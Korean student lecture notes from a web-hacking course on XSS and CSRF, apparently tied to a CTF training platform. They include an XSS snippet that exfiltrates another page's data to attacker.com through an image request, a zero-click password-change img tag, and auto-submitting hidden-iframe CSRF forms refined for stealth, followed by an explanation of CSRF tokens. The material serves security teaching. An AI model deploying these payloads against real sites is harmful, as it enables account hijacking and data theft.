12주차 수업.

서버 측 공격
SQL Injection

클라이언트 측 공격
XSS - Client 측 Script
CSRF

Client Script

다른 페이지에 있는 정보를 가져오는 연습.

XSS : 클라이언트 측 스크립트 삽입 공격.

> 게시판 글
-> 페이지 이동.
--> 작성한 스크립트 다 날라감

* 다른 페이지에 존재하는 데이터를 가져오는 script

<iframe id="myFrame" src="~~mypage.php"></iframe>

<script>
  var myFrame = document.getElementById('myFrame');

  var data = myFrame.contentDocument.getElementBy

  var i = new Image();
  i.src="https://attacker.com/?" + data;
</script>


* CSRF
(Cross Site Request Forgery)
-> 요청을 하게 만드는 것.
핵심 : 서버로 요청을 하게 만드는 것.

피해자.
/*
서버로 어떤 요청을 하는지 생각해보기
피해자가 어떻게 하면 서버에 이 요청을 하게 만들까
*/

* ~~ 님. 아래 사이트 좀 확인해주세요.
https://~~~~
컴퓨터에서 서버로 날라가는 요청이나 링크를 클릭하는 요청이나 똑같다.
=> 요청을 위조하는 공격

피해자가 자신의 의도와 무관하게 어떤 요청(공격자가 원하는 요청)을 하게 만드는 공격

|

CSRF VS XSS
스크립트를 삽입하지 않아도 클라이언트가 어떤 요청을 하게 만드는 것
클라이언트측 스크립트를 삽입하는 공격(클라이언트 측에서 실행됨)

클라이언트를 공격하는 기법이지만.

__________________________________

> CSRF (feat. XSS)

Zero Click

<img src="https://~~~~?password_new=1234&password_conf=1234&Change=Change">

크사랑 무슨 차이지?
XSS으로 쿠키 탈취, 피싱페이지로 리다이렉트, CSRF도 공격 가능

XSS가 없으면? -> CSRF가 없나요?
-> NO

_________

CSRF는 어디에서 일어나나요?
> 요청을 위조하는 공격.
> 요청을 하게 만드는 공격.

*******
- 모든 요청
| 컨설턴트 주관.

"https://~~~~?password_new=1234&password_conf=1234&Change=Change"
요청을 임의로 만들 수 있다면 CSRF 취약점으로 판단할 수 있다.

"http://youtube.com/?video=normaltic"
이런 것도 보호해야하는가?

게시판 글 수정. -> 
게시판 글 쓰기 -> 위험!?
이라고 생각해도 됨. 대신에 취약점이라고 설명할 수 있어야함

"https://~~~~?password_new=1234&password_conf=1234&Change=Change&old_password="
예전 비밀번호를 요구하는 경우, 이런 경우는 당연히 CSRF 공격을 하기 힘들다

| 비밀번호 변경

기존 비밀번호 : 

대신에 요청하기를 눌렀는데 인증 정보가 없으면? CSRF 취약점으로 잡을 수 있음


게시판 글 수정 ->
게시판 글 쓰기 요청.
> 관리자 노려!

_________

LINK -> GET

POST Method
POST로 바꾸는 것은 CSRF 공격을 막을 생각이 없는 것임

CSRF는 요청에 인증정보가 없는 것이 문제인데, POST 방식은 인증 정보가 들어있지 않음. 위조 여부 확인 근거가 없음
CSRF 취약점이 그대로 남게됨.

그러면 공격방식이 바뀌는데

form Tag를 삽입하게 됨 -> XSS
사이트에서는 XSS로부터 완전히 무결해야함. 그렇지 않으니 POST로 동작하면..
XSS를 쥐잡듯이 잡아야함.

<<Part2 강의 체크>>
Burp Suite에서 요청을 한번 보내고 인증 정보가 함께 전송되는지 확인
인증 정보가 없을 시에 게시판에서 form 태그를 만들기
<h1>Click This!!</h1>
<form method="POST" action="버프스위트에서 요청 url을 복사하여 여기에 붙이기">
<input type="hidden" name="email" value="normal%40test.com"/> -> 갑자기 input창이 생기는 것이 이상해서 hidden으로 바꿈
<input type="submit" value="Click Me" />
</form>

POST Method
=> CSRF XSS 연계 (form 태그 추가하면됨)

버튼 클릭 유도.

GET Method => 링크를 클릭하도록 유도
POST Method => form 태그 작성, 버튼 클릭 유도

그런데 버튼을 누가 클릭하나..
해결방안 => 전송 자동화. (XSS)

<h1>Hello~~~!</h1>
<form method="POST" action="버프스위트에서 요청 url을 복사하여 여기에 붙이기" id="myForm">
<input type="hidden" name="email" value="normal%40test.com"/>
</form>

<script>
document.getElementById('myForm').submit();
</script>

버튼을 눌렀는데 마이페이지가 뜸. 수상
해결방안 => iframe

<iframe name="stealthFrame"></iframe>

<h1>Hello~~~!</h1>
<form method="POST" action="버프스위트에서 요청 url을 복사하여 여기에 붙이기" id="myForm" target="stealthFrame"> 타겟을 넣어주면 결과가 iframe에 들어가게 된다.
<input type="hidden" name="email" value="normal%40test.com"/>
</form>

<script>
document.getElementById('myForm').submit();
</script>

단지 게시글을 읽었을 뿐인데, 이메일을 변경하는 요청이 보내짐



*****<하나 더 수정>
iframe이 보이는 문제.

<iframe name="stealthFrame" width="0" height="0" border="0"></iframe>

<h1>Hello~~~!</h1>
<form method="POST" action="버프스위트에서 요청 url을 복사하여 여기에 붙이기" id="myForm" target="stealthFrame"> 타겟을 넣어주면 결과가 iframe에 들어가게 된다.
<input type="hidden" name="email" value="normal%40test.com"/>
</form>

<script>
document.getElementById('myForm').submit();
</script>

iframe 크기를 전부 0으로 설정.


*****<하나 더 수정>
iframe 확대하면 점이 보임

<iframe name="stealthFrame" style="display: none;"></iframe>

<h1>Hello~~~!</h1>
<form method="POST" action="버프스위트에서 요청 url을 복사하여 여기에 붙이기" id="myForm" target="stealthFrame"> 타겟을 넣어주면 결과가 iframe에 들어가게 된다.
<input type="hidden" name="email" value="normal%40test.com"/>
</form>

<script>
document.getElementById('myForm').submit();
</script>

style: "display: none;" 추가. 이때는 크기 0으로 설정할 필요는 없음

<img src=""> 태그로도 가능

__________________________________

* CSRF Token
> CSRF 공격을 막기 위해서 만든 랜덤한 토큰.

마이페이지에 접속할 떄
-> 토큰 발행

<form>
<input>

<input type="hidden" name="csrfToken" value="fjwoejfwoiefjoew">
</form>

이와 같이 토큰을 발행해서 DB에 저장을 하고,
정보를 수정할 때에는 토큰을 함께 전송받도록 함.

마이페이지에 들어갈 때, 토큰이 맞다면 마이페이지 접속 가능하게 함.
혹은 게시판에 접근할 때, 토큰이 맞다면 게시판 수정 및 삭제가 가능하게 함.

http://ctf.segfaulthub.com:7575/csrf_1/mypage_update.php?id=&info=&pw=hi&csrf_token=djfiejfie
서버에서는 보낸 csrf_token과 서버에 저장된 token을 비교해서 똑같으면 마이페이지에서 요청을 보낸 것이구나.
만약에 다르면 비밀번호를 안바꿔줌

마이페이지에 들어가면 랜덤한 값으로 토큰이 hidden으로 발행됨.
토큰이 만약에 틀렸으면 에러가 발생.

CSRF 토큰이 우회가 가능하긴함.
<iframe src="myypage">

<script>

</script>

* 과제
1. CSRF 문제 풀이
2. CSRF 문제 풀이 write-up 보고서.
> 설명을 깃들여서 작성한다!

3. 웹 개발 과제.

___

- 할게 없다!